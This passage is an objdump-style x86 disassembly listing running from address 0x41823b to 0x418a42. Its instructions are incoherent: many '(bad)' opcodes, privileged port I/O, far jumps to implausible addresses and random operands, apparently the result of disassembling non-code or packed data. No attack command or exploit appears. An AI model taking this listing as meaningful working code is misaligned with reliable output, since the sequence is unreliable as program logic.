  41823b:	and    DWORD PTR ds:0x58cb334b,eax
  418241:	icebp  
  418242:	and    ebp,DWORD PTR ds:[ebx+0x63]
  418246:	enter  0x6abd,0x7d
  41824a:	mov    ds:0x545ba561,eax
  41824f:	and    DWORD PTR ds:0x4c538cc9,eax
  418255:	sbb    BYTE PTR [edi+0x64d81ac8],al
  41825b:	dec    esi
  41825c:	xchg   ebx,eax
  41825d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41825e:	fisttp DWORD PTR [edx]
  418260:	out    0xdf,al
  418262:	push   es
  418263:	cli    
  418264:	outs   dx,BYTE PTR ds:[esi]
  418265:	fwait
  418266:	nop
  418267:	pop    edx
  418268:	pop    esp
  418269:	iret   
  41826a:	es hlt 
  41826c:	jge    0x418268
  41826e:	(bad)  
  418270:	jnp    0x4182a5
  418272:	push   esi
  418273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418274:	cmc    
  418275:	das    
  418276:	inc    ebp
  418277:	mov    ds:0x61eeb2e2,eax
  41827c:	pop    ecx
  41827d:	sbb    al,0x80
  41827f:	add    ah,BYTE PTR [ebx+0x71]
  418282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418283:	sbb    dl,cl
  418285:	mov    dh,0x73
  418287:	jns    0x4182f1
  418289:	sbb    eax,0x4bbcb99a
  41828e:	stc    
  41828f:	inc    ebp
  418290:	inc    esi
  418291:	xor    esp,eax
  418293:	xchg   ebp,eax
  418294:	mov    eax,ds:0x2d4afadb
  418299:	cmp    eax,0xeb3732ad
  41829e:	mov    ecx,0x5d00d91a
  4182a3:	outs   dx,BYTE PTR ds:[esi]
  4182a4:	frndint 
  4182a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a7:	cmc    
  4182a8:	in     eax,0xca
  4182aa:	or     esp,0x208a661c
  4182b0:	in     al,dx
  4182b1:	out    0x7f,eax
  4182b3:	mov    cl,0x86
  4182b5:	inc    esp
  4182b6:	ds js  0x418317
  4182b9:	ror    edx,cl
  4182bb:	mov    DWORD PTR [bx+0x48],esp
  4182bf:	retf   0x2586
  4182c2:	call   0xb9c9c5b1
  4182c7:	js     0x418311
  4182c9:	inc    ebx
  4182ca:	fld    DWORD PTR [esi-0x21e72f64]
  4182d0:	in     eax,dx
  4182d1:	cs pop edi
  4182d3:	or     al,0xb3
  4182d5:	add    bl,BYTE PTR [ecx+0x425c3a27]
  4182db:	ds mov al,0x7f
  4182de:	push   esp
  4182df:	lds    ebx,FWORD PTR [esi+eiz*4]
  4182e2:	xor    ah,bh
  4182e4:	adc    DWORD PTR ds:0x533dd04,edx
  4182ea:	adc    ah,BYTE PTR [edi]
  4182ec:	xor    eax,0xfd8135c6
  4182f1:	push   ebx
  4182f2:	and    al,0x3f
  4182f4:	inc    ebp
  4182f5:	dec    esi
  4182f6:	jb     0x418369
  4182f8:	or     al,0x7c
  4182fa:	shr    edx,0xb1
  4182fd:	add    dh,BYTE PTR [ecx-0x43]
  418300:	cmp    BYTE PTR gs:[esi-0x37],cl
  418304:	aam    0xf3
  418306:	or     eax,0x824e02bc
  41830b:	or     edi,DWORD PTR [esi]
  41830d:	xchg   esp,eax
  41830e:	push   ebp
  41830f:	and    edi,DWORD PTR [ebx+0x3e37c31b]
  418315:	popf   
  418316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418317:	or     dh,BYTE PTR [esi-0x4e]
  41831a:	retf   
  41831b:	push   edx
  41831c:	jl     0x418361
  41831e:	adc    al,0x51
  418320:	arpl   WORD PTR [eax-0x1d2294d7],cx
  418326:	add    DWORD PTR [ecx],ecx
  418328:	ins    DWORD PTR es:[edi],dx
  418329:	jg     0x418324
  41832b:	adc    al,0xc6
  41832d:	dec    esp
  41832e:	sub    DWORD PTR [ebx-0x46],edx
  418331:	or     eax,0x69f44026
  418336:	mov    bl,0x5c
  418338:	mov    ah,0xc2
  41833a:	inc    eax
  41833b:	and    edx,0x6b
  41833e:	dec    edx
  41833f:	leave  
  418340:	ror    ebx,1
  418342:	or     BYTE PTR [ebx+0x25b4fb2f],cl
  418348:	sub    al,0x4d
  41834a:	loop   0x41835a
  41834c:	nop
  41834d:	mov    eax,0xfaf3684c
  418352:	cmp    esp,DWORD PTR [ecx+ebx*4+0x29500c07]
  418359:	outs   dx,DWORD PTR ds:[esi]
  41835a:	or     DWORD PTR [edx],edx
  41835c:	sub    edx,esi
  41835e:	mov    dl,0x75
  418360:	es xor al,0xd1
  418363:	pop    ecx
  418364:	push   es
  418365:	data16 cld 
  418367:	inc    ecx
  418368:	xchg   esp,eax
  418369:	sbb    edx,ebp
  41836b:	call   0xf94b:0x23d425bc
  418372:	ffree  st(5)
  418374:	jo     0x418346
  418376:	or     eax,0x74c42d28
  41837b:	aaa    
  41837c:	jb     0x4183f4
  41837e:	inc    ebp
  41837f:	xchg   edi,eax
  418380:	std    
  418381:	mov    ebx,0x43051bb8
  418386:	fndisi(8087 only) 
  418388:	and    al,0x3
  41838a:	inc    eax
  41838b:	es dec esp
  41838d:	sub    DWORD PTR [ecx-0x21],edx
  418390:	mov    ds:0xd4003710,eax
  418395:	test   eax,0x47ab34ed
  41839a:	loope  0x4183cb
  41839c:	and    al,0xde
  41839e:	push   ss
  41839f:	repnz adc eax,0xffaed328
  4183a5:	add    BYTE PTR [edx],bl
  4183a7:	in     eax,0x72
  4183a9:	in     al,0x44
  4183ab:	xor    ebp,DWORD PTR [esi+0x14]
  4183ae:	push   ebp
  4183af:	cmp    BYTE PTR [esi+eax*2],dh
  4183b2:	retf   
  4183b3:	in     eax,0x4
  4183b5:	test   DWORD PTR [eax+0x53526980],0x238c4c6c
  4183bf:	push   esp
  4183c0:	imul   esi,DWORD PTR [ecx+0x66149dc],0xc4654cb0
  4183ca:	and    BYTE PTR [ecx],ch
  4183cc:	mov    al,0x1f
  4183ce:	ja     0x41843b
  4183d0:	pushf  
  4183d1:	xchg   ebp,eax
  4183d2:	push   cs
  4183d3:	call   0x46ce:0x7545863f
  4183da:	out    dx,al
  4183db:	dec    edi
  4183dc:	or     al,0x61
  4183de:	or     BYTE PTR [esi-0x23],0x22
  4183e2:	and    al,0x60
  4183e4:	and    al,0x15
  4183e6:	sbb    al,0xa7
  4183e8:	clc    
  4183e9:	inc    ah
  4183eb:	rcl    DWORD PTR [edx],cl
  4183ed:	jno    0x4183c3
  4183ef:	push   ds
  4183f0:	mov    ds:0x7cdd3772,al
  4183f5:	imul   esp,DWORD PTR [ebp-0x2c1be09],0x588ac7d
  4183ff:	mov    BYTE PTR [ebp+0x47],0x15
  418403:	pop    eax
  418404:	push   ebx
  418405:	ret    
  418406:	push   ebx
  418407:	mov    ds:0x7522573e,eax
  41840c:	push   0xb7ab6ec
  418411:	mov    WORD PTR [ebx+0x3a],ss
  418414:	int    0xf0
  418416:	inc    ecx
  418417:	xchg   ebx,eax
  418418:	test   BYTE PTR [edi+ebx*8-0x4],dh
  41841c:	dec    eax
  41841d:	ds pop ebx
  41841f:	fisubr DWORD PTR [ebp-0x4e]
  418422:	sub    BYTE PTR [edi],0x3c
  418425:	or     BYTE PTR [esi+0x1e],bh
  418428:	cmp    esi,DWORD PTR [eax+0x41]
  41842b:	outs   dx,DWORD PTR ds:[esi]
  41842c:	(bad)  
  41842d:	jno    0x41845f
  41842f:	cmp    eax,DWORD PTR [ebp-0x6e]
  418432:	pop    ds
  418433:	call   DWORD PTR gs:[ebp+0x98294af]
  41843a:	data16 mov bl,0xf1
  41843d:	mov    dl,BYTE PTR [esi+eax*8+0x1f54102b]
  418444:	xor    eax,0x5f06607
  418449:	cmp    cl,bh
  41844b:	or     DWORD PTR [edx+0x79dcd2f9],edx
  418451:	adc    DWORD PTR [edi-0x4633d695],ebp
  418457:	lods   al,BYTE PTR ds:[esi]
  418458:	jne    0x418456
  41845a:	(bad)  
  41845c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41845d:	adc    al,0x32
  41845f:	cmpxchg BYTE PTR [esi+eiz*4],dl
  418463:	sar    BYTE PTR [ebx],1
  418465:	inc    ebp
  418466:	(bad)  
  418467:	xlat   BYTE PTR ds:[ebx]
  418468:	xchg   DWORD PTR [edx+0x8da3c97],esp
  41846e:	dec    eax
  41846f:	push   ds
  418470:	sbb    al,0x4b
  418472:	ret    
  418473:	xor    BYTE PTR [ecx+0x1a7b4d89],0x26
  41847a:	bswap  edi
  41847c:	pop    edx
  41847d:	test   al,0x2d
  41847f:	mov    ds:0x2b6e1274,al
  418484:	cld    
  418485:	xchg   ebp,eax
  418486:	out    0x8c,eax
  418488:	cli    
  418489:	jp     0x418453
  41848b:	mov    cl,0x88
  41848d:	xchg   esp,eax
  41848e:	push   eax
  418490:	jnp    0x4184c4
  418492:	je     0x41849b
  418494:	mov    eax,0xba05ceda
  418499:	leave  
  41849a:	cwde   
  41849b:	and    eax,0x3b099f1f
  4184a0:	(bad)  
  4184a1:	nop
  4184a2:	mov    ecx,0x38d7eaa4
  4184a7:	ins    BYTE PTR es:[edi],dx
  4184a8:	push   edx
  4184a9:	mov    ds:0xe5481889,al
  4184ae:	xchg   ah,ch
  4184b0:	mov    dh,0x92
  4184b2:	rcl    BYTE PTR [eax+0x1b],0x2c
  4184b6:	ins    BYTE PTR es:[edi],dx
  4184b7:	call   0xd22b:0x5a1be8e3
  4184be:	or     al,0xe1
  4184c0:	mov    dl,0xfa
  4184c2:	sub    bl,BYTE PTR [eax-0x2b00d2c3]
  4184c8:	cmp    DWORD PTR [ebx-0x59],eax
  4184cb:	mov    dl,0x22
  4184cd:	inc    DWORD PTR [ebp-0x16]
  4184d0:	mul    esp
  4184d2:	push   ebx
  4184d3:	int    0x73
  4184d5:	push   edx
  4184d6:	jbe    0x4184c0
  4184d8:	jbe    0x418463
  4184da:	ficom  WORD PTR [ecx]
  4184dc:	add    eax,0x71d559be
  4184e1:	xor    DWORD PTR [ebx-0x6b],eax
  4184e4:	jno    0x418482
  4184e6:	jp     0x418510
  4184e8:	mov    WORD PTR [ebx+0x67],?
  4184eb:	jbe    0x418487
  4184ed:	cli    
  4184ee:	jmp    0x41851e
  4184f0:	in     eax,dx
  4184f1:	adc    edi,DWORD PTR [ebx+0x63bbd8dc]
  4184f7:	loope  0x4184f7
  4184f9:	xor    edi,ecx
  4184fb:	or     bl,BYTE PTR [ecx-0x2]
  4184fe:	xchg   esi,eax
  4184ff:	retf   0xf855
  418502:	adc    al,0x26
  418504:	loop   0x418579
  418506:	jp     0x4184c0
  418508:	hlt    
  418509:	mov    DWORD PTR [eax],ebx
  41850b:	loope  0x41855f
  41850d:	xchg   esi,eax
  41850e:	or     BYTE PTR fs:[edx+0x6a0a1660],dh
  418515:	jmp    0x52d2:0xdfc99d12
  41851c:	adc    DWORD PTR [esi+0x2f],0x77
  418520:	outs   dx,BYTE PTR ds:[esi]
  418521:	xchg   edi,eax
  418522:	lea    ebp,[esi]
  418524:	out    0xac,al
  418526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418527:	or     esi,DWORD PTR [ecx]
  418529:	addr16 ret 
  41852b:	(bad)  
  41852c:	cmp    DWORD PTR [ebp-0x2e],esi
  41852f:	fbstp  TBYTE PTR [eax-0x6c]
  418532:	iret   
  418533:	sub    al,dh
  418535:	jle    0x4184ed
  418537:	int3   
  418538:	cmp    al,0xa2
  41853a:	int    0x23
  41853c:	mov    edx,0x639d744d
  418541:	call   0xdd1c14df
  418546:	push   ebx
  418547:	pop    esp
  418548:	mov    cl,0xa5
  41854a:	inc    eax
  41854b:	push   ebx
  41854c:	xchg   edi,ebp
  41854e:	mov    ah,0xc3
  418550:	xor    al,0x3d
  418552:	push   esi
  418553:	jb     0x4185a8
  418555:	shl    ah,0xae
  418558:	xchg   edx,eax
  418559:	addr16 push edi
  41855b:	aaa    
  41855c:	push   ecx
  41855d:	(bad)  
  41855e:	push   cs
  41855f:	retf   0x107
  418562:	loope  0x418567
  418564:	xchg   edi,eax
  418565:	iret   
  418566:	sub    BYTE PTR [ecx+0x355c3e56],bl
  41856c:	fwait
  41856d:	xchg   BYTE PTR [edx+0xb42b359],ah
  418573:	in     eax,0x4
  418575:	fnsave ds:0x34bf280e
  41857b:	in     al,0xde
  41857d:	mov    eax,0x53b91af7
  418582:	jo     0x418582
  418584:	leave  
  418585:	repnz add dh,BYTE PTR [esi+eax*1+0x32697272]
  41858d:	jo     0x418565
  41858f:	push   edi
  418590:	xchg   ebx,eax
  418591:	cmp    dl,BYTE PTR [esi+0x9f64043]
  418597:	fistp  DWORD PTR [edi-0x5c88667b]
  41859d:	enter  0xa59b,0xe7
  4185a1:	pop    edi
  4185a2:	loop   0x418534
  4185a4:	mov    dl,0xf2
  4185a6:	sub    eax,0xfe2e69ef
  4185ab:	cwde   
  4185ac:	dec    ecx
  4185ae:	shr    DWORD PTR [ecx],cl
  4185b0:	mov    al,ds:0x7ac91ba9
  4185b5:	or     al,0x80
  4185b7:	pop    ebx
  4185b8:	jnp    0x41857d
  4185ba:	or     BYTE PTR [ecx-0x78],bl
  4185bd:	mov    esi,0x8c1d8f5
  4185c2:	inc    ecx
  4185c3:	pop    es
  4185c4:	loop   0x418576
  4185c6:	sahf   
  4185c7:	imul   ebx,DWORD PTR [eax+0x28fee93],0x91fb5ca0
  4185d1:	adc    edx,DWORD PTR [esi+0x79]
  4185d4:	push   edi
  4185d5:	pop    eax
  4185d6:	sub    edx,ecx
  4185d8:	mov    bh,0x9c
  4185da:	(bad)  
  4185db:	add    al,0x98
  4185dd:	and    DWORD PTR [edi-0x77],ebx
  4185e0:	addr16 cdq 
  4185e2:	sbb    DWORD PTR [esp+edi*1-0x6b],ebp
  4185e6:	add    ecx,eax
  4185e8:	dec    eax
  4185e9:	in     al,dx
  4185ea:	push   eax
  4185eb:	adc    BYTE PTR [eax+0x128428c6],dh
  4185f1:	xor    al,0x50
  4185f3:	in     al,0xcb
  4185f5:	mov    ebp,0xd7f0e6c
  4185fa:	push   cs
  4185fb:	mov    edx,0x8097c570
  418600:	neg    dl
  418602:	or     al,0xe
  418604:	test   eax,0xb4ec7fe3
  418609:	pop    esi
  41860a:	xchg   edx,eax
  41860b:	push   eax
  41860c:	in     eax,dx
  41860d:	sbb    BYTE PTR [ebx+ebx*4],bh
  418610:	xchg   ebp,eax
  418611:	dec    esi
  418612:	pop    ss
  418613:	or     cl,dl
  418615:	or     eax,0xd7543f4e
  41861a:	and    al,0xe8
  41861c:	jg     0x4185f7
  41861e:	dec    BYTE PTR [eax+0x11]
  418621:	dec    esp
  418622:	xlat   BYTE PTR ds:[ebx]
  418623:	xor    ebp,DWORD PTR [esi+0x57]
  418626:	or     BYTE PTR [esp+ecx*1+0xc3a6148],al
  41862d:	mov    cl,0x54
  41862f:	call   0x103a807b
  418634:	and    ebp,DWORD PTR [esi+0xa3c5c4]
  41863a:	in     eax,0xc9
  41863c:	mov    bl,ch
  41863e:	xchg   DWORD PTR [ebp-0x1d],edx
  418641:	or     eax,0x60ded311
  418646:	ds daa 
  418648:	jg     0x4185ff
  41864a:	stos   DWORD PTR es:[edi],eax
  41864b:	xchg   esi,eax
  41864c:	xchg   DWORD PTR [eax],ebx
  41864e:	pop    ds
  41864f:	out    dx,al
  418650:	lods   al,BYTE PTR ds:[esi]
  418651:	into   
  418652:	jae    0x41869a
  418654:	in     eax,0x44
  418656:	push   ebp
  418657:	xor    edx,DWORD PTR [edi+edi*2-0x72]
  41865b:	aam    0x5e
  41865d:	fdiv   DWORD PTR [ebp+0x1c]
  418660:	jbe    0x418613
  418662:	(bad)  [esi-0x6c]
  418665:	push   eax
  418666:	mov    ebp,0xe7360026
  41866b:	popf   
  41866c:	neg    eax
  41866e:	retf   0x83bf
  418671:	jg     0x4186e3
  418673:	lods   eax,DWORD PTR ds:[esi]
  418674:	adc    BYTE PTR [edi],bl
  418676:	add    BYTE PTR [ecx+0x58],0xd6
  41867a:	mov    eax,0x8106b528
  41867f:	add    eax,0xc311aa24
  418684:	lahf   
  418685:	and    al,BYTE PTR [ecx-0x5b9efcb]
  41868b:	adc    ecx,DWORD PTR ds:0x838f7db6
  418691:	out    dx,eax
  418692:	add    dh,ch
  418694:	sbb    al,0xde
  418696:	xchg   ebx,eax
  418697:	push   0xfffffff6
  418699:	stc    
  41869a:	jmp    0xfd69:0x54453c35
  4186a1:	or     eax,DWORD PTR [edx]
  4186a3:	ins    DWORD PTR es:[edi],dx
  4186a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186a6:	mov    edi,0xef83fa47
  4186ab:	rcr    BYTE PTR [ebx-0x2e71f3b1],cl
  4186b1:	mov    al,ds:0x3dd37ff7
  4186b6:	and    dh,BYTE PTR [edi]
  4186b8:	or     edx,DWORD PTR [edx-0x2]
  4186bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186bc:	push   fs
  4186be:	fsubr  QWORD PTR [ecx]
  4186c0:	stos   BYTE PTR es:[edi],al
  4186c1:	xor    al,0x51
  4186c3:	xor    eax,0xeeae8bbb
  4186c8:	lds    esp,FWORD PTR [eax+0x10a000d]
  4186ce:	sbb    edx,DWORD PTR [ecx+0xf2f7700]
  4186d4:	stos   BYTE PTR es:[edi],al
  4186d5:	sbb    eax,0x43167630
  4186da:	xor    ah,BYTE PTR [ebp+0x23f43c48]
  4186e0:	push   ebx
  4186e1:	imul   ebp,DWORD PTR [esi+ebx*1],0xffffffd4
  4186e5:	jne    0x418763
  4186e7:	cmp    eax,0xd7af8b45
  4186ec:	les    edi,FWORD PTR [edi+0x2e]
  4186ef:	es repnz push ss
  4186f2:	xchg   edi,eax
  4186f3:	xor    edx,DWORD PTR [eax]
  4186f5:	and    ch,bh
  4186f7:	and    BYTE PTR [eax],dl
  4186f9:	xchg   edx,eax
  4186fa:	(bad)  
  4186fc:	out    dx,eax
  4186fd:	retf   
  4186fe:	jge    0x418752
  418700:	mov    edx,0x2d434ecc
  418705:	lock dec edi
  418707:	sbb    eax,0x8d958dfe
  41870c:	shl    BYTE PTR [edi+0x23],cl
  41870f:	loopne 0x418716
  418711:	cmp    DWORD PTR [edi+0x1b1055d6],0x9d262b29
  41871b:	ds sub esi,ecx
  41871e:	(bad)  
  41871f:	lods   eax,DWORD PTR ds:[esi]
  418720:	dec    eax
  418721:	out    dx,al
  418722:	pop    edi
  418723:	mov    dh,0x65
  418725:	mov    ebp,ecx
  418727:	push   es
  418728:	aaa    
  418729:	push   ds
  41872a:	test   DWORD PTR [eax-0x56a670ce],edx
  418730:	nop
  418731:	cld    
  418732:	cmp    BYTE PTR [edi-0x2353a6cf],0xce
  418739:	jp     0x418751
  41873b:	call   0x6b2041e1
  418740:	adc    BYTE PTR [esi],dh
  418742:	inc    esp
  418743:	xor    bl,dh
  418745:	add    eax,0x45b4ca02
  41874a:	fistp  QWORD PTR [esi+ebx*2+0x51a57ca3]
  418751:	pop    ebp
  418752:	repz adc dh,dl
  418755:	pop    ebp
  418756:	add    bl,0x48
  418759:	add    ch,BYTE PTR [ebx]
  41875b:	mov    ah,0x60
  41875d:	fsubr  DWORD PTR [eax+0x46b4b382]
  418763:	lea    eax,[edi]
  418765:	mov    ecx,0xb145eb0c
  41876a:	pop    edi
  41876b:	inc    edx
  41876c:	ins    BYTE PTR es:[edi],dx
  41876d:	gs sbb al,0x41
  418770:	jle    0x41872f
  418772:	jmp    0x8f5d:0xbf014780
  418779:	or     eax,DWORD PTR [ebx+edi*2+0x6242d966]
  418780:	cmp    al,bl
  418782:	xor    al,BYTE PTR [eax-0x1b]
  418785:	ror    BYTE PTR [ebx-0x18d688b6],cl
  41878b:	fbld   TBYTE PTR [ebp-0x188693e]
  418791:	sti    
  418792:	xchg   edx,eax
  418793:	push   edi
  418794:	mov    edx,0xa4c21473
  418799:	out    dx,eax
  41879a:	sub    ebp,DWORD PTR [ebp+0x664868c2]
  4187a0:	imul   edx,DWORD PTR [esp+ecx*2-0x519c4f11],0x21
  4187a8:	xchg   edi,eax
  4187a9:	nop
  4187aa:	enter  0x2280,0x2e
  4187ae:	xlat   BYTE PTR ds:[ebx]
  4187af:	jnp    0x41877b
  4187b1:	or     ah,BYTE PTR [ebx]
  4187b3:	pop    ss
  4187b4:	xchg   ebx,eax
  4187b5:	dec    ebp
  4187b6:	cmp    BYTE PTR [eax-0x38eafc2],bh
  4187bc:	pop    eax
  4187bd:	pop    esp
  4187be:	xchg   ebx,eax
  4187bf:	imul   eax,ecx,0xa794f7f8
  4187c5:	sbb    eax,0xd9a42666
  4187ca:	fild   WORD PTR [ebp+0x2140a6c6]
  4187d0:	push   0x59
  4187d2:	cmp    BYTE PTR [esi+edx*8+0x4e913d67],ah
  4187d9:	outs   dx,BYTE PTR ds:[esi]
  4187da:	or     bl,al
  4187dc:	sti    
  4187dd:	fs inc ebp
  4187df:	and    al,BYTE PTR [esp+esi*1-0x2b]
  4187e3:	cwde   
  4187e4:	sub    al,0x52
  4187e6:	push   esi
  4187e7:	lock mov al,0xa
  4187ea:	xor    edx,DWORD PTR [ebx-0x2e]
  4187ed:	or     al,0xc2
  4187ef:	push   ebp
  4187f0:	lods   al,BYTE PTR ds:[esi]
  4187f1:	lods   al,BYTE PTR ds:[esi]
  4187f2:	xor    eax,0x1210127f
  4187f7:	daa    
  4187f8:	sti    
  4187f9:	adc    bl,BYTE PTR [esi]
  4187fb:	sub    BYTE PTR [edx+0x43],0xe6
  4187ff:	dec    edi
  418800:	jmp    0x3b5f:0x4ab8cba4
  418807:	nop
  418808:	out    dx,eax
  418809:	dec    edx
  41880a:	pop    esi
  41880b:	xchg   ecx,eax
  41880c:	mov    cl,BYTE PTR [eax]
  41880e:	dec    edx
  41880f:	sbb    ah,BYTE PTR [eax]
  418811:	xlat   BYTE PTR ds:[ebx]
  418812:	dec    esi
  418813:	add    edi,DWORD PTR [eax+edi*8]
  418816:	cmp    cl,BYTE PTR [ebx]
  418818:	adc    bl,al
  41881a:	mov    al,0x47
  41881c:	daa    
  41881d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41881e:	mov    ch,0x9f
  418820:	ins    DWORD PTR es:[edi],dx
  418821:	sbb    bh,dl
  418823:	sti    
  418824:	mov    DWORD PTR [ebp+ebp*4+0x7bcedf66],ebx
  41882b:	fdiv   st(4),st
  41882d:	pop    eax
  41882e:	test   al,0xb2
  418830:	ret    
  418831:	xor    esp,DWORD PTR [edi+0x68]
  418834:	ss push esi
  418836:	add    bl,dh
  418838:	sbb    BYTE PTR [esi+edx*8-0x75969031],dh
  41883f:	js     0x418868
  418841:	push   0x68
  418843:	jnp    0x418881
  418845:	and    esi,esp
  418847:	xor    DWORD PTR [esi],0x59464b45
  41884d:	neg    DWORD PTR [edi+0x546a0a4c]
  418853:	jl     0x41884b
  418855:	in     al,0x97
  418857:	xadd   BYTE PTR [edx],ah
  41885a:	stos   DWORD PTR es:[edi],eax
  41885b:	fimul  DWORD PTR [ebp+0x277794d3]
  418862:	jle    0x4188af
  418864:	or     dl,al
  418866:	dec    esi
  418867:	cmp    al,0xf3
  418869:	inc    eax
  41886a:	ds cmc 
  41886c:	gs and dh,dl
  41886f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418870:	xchg   cl,al
  418872:	mov    al,0x3a
  418874:	mov    eax,0x96ff2fa8
  418879:	in     al,dx
  41887a:	mov    ecx,0xada00db
  41887f:	pop    ss
  418880:	xchg   edi,eax
  418881:	lahf   
  418882:	and    eax,edi
  418884:	add    al,BYTE PTR [ebx-0x536c6bdd]
  41888a:	std    
  41888b:	aas    
  41888c:	xchg   ebp,eax
  41888d:	sbb    dh,BYTE PTR [edx]
  41888f:	popf   
  418890:	mov    edx,0x69c80ad6
  418895:	push   es
  418896:	leave  
  418897:	mov    dh,0x56
  418899:	dec    esi
  41889a:	jo     0x418904
  41889c:	jns    0x4188ac
  41889e:	std    
  41889f:	add    DWORD PTR [ebx+0x34d5d096],0x4
  4188a6:	rcl    BYTE PTR ds:0x3e6dd269,1
  4188ac:	inc    esp
  4188ad:	mov    dh,BYTE PTR [ebx+0x30]
  4188b0:	dec    ebp
  4188b1:	iret   
  4188b2:	push   ds
  4188b3:	aas    
  4188b4:	sub    eax,0x9749f892
  4188b9:	js     0x4188f2
  4188bb:	(bad)  
  4188bd:	dec    esp
  4188be:	scas   al,BYTE PTR es:[edi]
  4188bf:	imul   eax,DWORD PTR [ebp-0x1864bedf],0xf6bffb01
  4188c9:	push   es
  4188ca:	cmp    cl,al
  4188cc:	xchg   ecx,eax
  4188cd:	loopne 0x41894a
  4188cf:	inc    eax
  4188d0:	mov    ds:0x3a0608cc,eax
  4188d5:	mov    esi,0xbe9ff92d
  4188da:	jle    0x418911
  4188dc:	jbe    0x418956
  4188de:	add    esp,0x62
  4188e1:	stos   BYTE PTR es:[edi],al
  4188e2:	jmp    0x41892d
  4188e4:	and    eax,0x9f18e27f
  4188e9:	mov    ch,0xad
  4188eb:	ret    
  4188ec:	xchg   esp,eax
  4188ed:	int    0xed
  4188ef:	iret   
  4188f0:	add    DWORD PTR [edx],0x8eee112d
  4188f6:	jmp    0x129966b5
  4188fb:	xor    BYTE PTR [edi+0x4158d6c9],dl
  418901:	cmp    eax,0xcd513af7
  418906:	ja     0x418902
  418908:	fs sub ch,ch
  41890b:	xchg   ebx,eax
  41890c:	xor    ebx,DWORD PTR [edi-0xb]
  41890f:	mov    eax,0xb2b7ac0a
  418914:	rol    BYTE PTR [edx-0x63],1
  418917:	cmp    bl,dl
  418919:	mov    ebp,0xb50f0aa5
  41891e:	push   ss
  41891f:	mov    esp,0xc37c75c5
  418924:	aad    0xc
  418926:	jmp    0x3bd21b3c
  41892b:	mov    edi,0x5a9fb31e
  418930:	fmul   QWORD PTR [ecx-0x37]
  418933:	lds    esi,FWORD PTR [edi+esi*1]
  418936:	nop
  418937:	pusha  
  418938:	and    ah,ah
  41893a:	dec    ecx
  41893b:	lods   al,BYTE PTR ds:[esi]
  41893c:	arpl   WORD PTR [edx-0x5],si
  41893f:	and    eax,0x30d8b4e7
  418944:	dec    edx
  418945:	cdq    
  418946:	push   esp
  418947:	ret    0x1f6a
  41894a:	call   0xd7f49390
  41894f:	daa    
  418950:	sub    DWORD PTR [ebx],0xffffffb2
  418953:	repz push ebp
  418955:	push   edx
  418956:	pusha  
  418957:	test   DWORD PTR [edx],ecx
  418959:	cmp    BYTE PTR [edi-0x303c1f2e],bl
  41895f:	sub    al,0x3f
  418961:	xor    ecx,ebx
  418963:	adc    eax,esi
  418965:	and    al,0x5
  418967:	shl    BYTE PTR [esi+0x27],cl
  41896a:	jecxz  0x41890f
  41896c:	imul   eax,DWORD PTR fs:[edi+esi*2],0xd4bb5ed8
  418974:	push   esi
  418975:	sub    DWORD PTR [ebx+0x66da9120],0xffffffcc
  41897c:	pop    ss
  41897d:	inc    edi
  41897e:	dec    esi
  41897f:	mov    dl,0xd6
  418981:	imul   esp,DWORD PTR [eax],0x29b480c7
  418987:	(bad)  
  418988:	pop    es
  418989:	push   esi
  41898a:	push   edi
  41898b:	cs inc eax
  41898d:	out    dx,eax
  41898e:	cmc    
  41898f:	push   ds
  418990:	icebp  
  418991:	mov    al,0xf1
  418993:	mov    edx,eax
  418995:	sub    BYTE PTR [ebp-0x1175cf3b],dl
  41899b:	lock jmp 0x15aa:0x57407c77
  4189a3:	xor    dh,BYTE PTR [ebx+0x2d]
  4189a6:	add    esi,DWORD PTR [esi+0x3f]
  4189a9:	fidivr WORD PTR [edi+0x44abc26b]
  4189af:	sub    al,0x53
  4189b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189b2:	cwde   
  4189b3:	mov    edx,0x8115ef91
  4189b8:	pop    eax
  4189b9:	xchg   edx,eax
  4189ba:	aad    0xdd
  4189bc:	sbb    al,BYTE PTR [ebp+0x15518b17]
  4189c2:	data16 fdivp st(1),st
  4189c5:	popa   
  4189c6:	push   ds
  4189c7:	or     esp,edi
  4189c9:	daa    
  4189ca:	dec    DWORD PTR [ebx-0x1439dbf8]
  4189d0:	(bad)  
  4189d2:	push   ebp
  4189d3:	and    eax,0xc138b7b4
  4189d8:	sbb    BYTE PTR [ebx-0x2f41726],ch
  4189de:	fwait
  4189df:	fs jnp 0x41898a
  4189e2:	les    ecx,FWORD PTR [ecx-0x6f56653]
  4189e8:	pushf  
  4189e9:	inc    BYTE PTR [esi+edi*4+0x16315ee2]
  4189f0:	mov    BYTE PTR [ebx-0x16],dl
  4189f3:	test   DWORD PTR [edx+0x39985ed0],edi
  4189f9:	ror    bl,cl
  4189fb:	int3   
  4189fc:	jmp    0xe70ba7fe
  418a01:	pop    ecx
  418a02:	mov    fs:0xfff48292,eax
  418a08:	mov    al,BYTE PTR [esi]
  418a0a:	adc    edi,ecx
  418a0c:	cmp    ecx,DWORD PTR [esi-0x13]
  418a0f:	dec    ebp
  418a10:	jmp    0x3f2:0x7de02c77
  418a17:	xchg   esp,eax
  418a18:	arpl   WORD PTR [edx-0x66],sp
  418a1b:	jnp    0x4189f8
  418a1d:	repnz xor eax,0x55
  418a21:	or     eax,edi
  418a23:	sbb    DWORD PTR [ecx-0x59],edx
  418a26:	std    
  418a27:	pop    ds
  418a28:	ds xor ah,dh
  418a2b:	jmp    0x251:0x6b572e93
  418a32:	inc    esi
  418a33:	jmp    0x4189e4
  418a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a36:	pop    edx
  418a37:	inc    ecx
  418a38:	sub    edi,0xffffffa4
  418a3b:	lahf   
  418a3c:	cmp    al,0xd5
  418a3e:	(bad)  
  418a3f:	cdq    
  418a40:	in     al,0x1
  418a42:	femms  
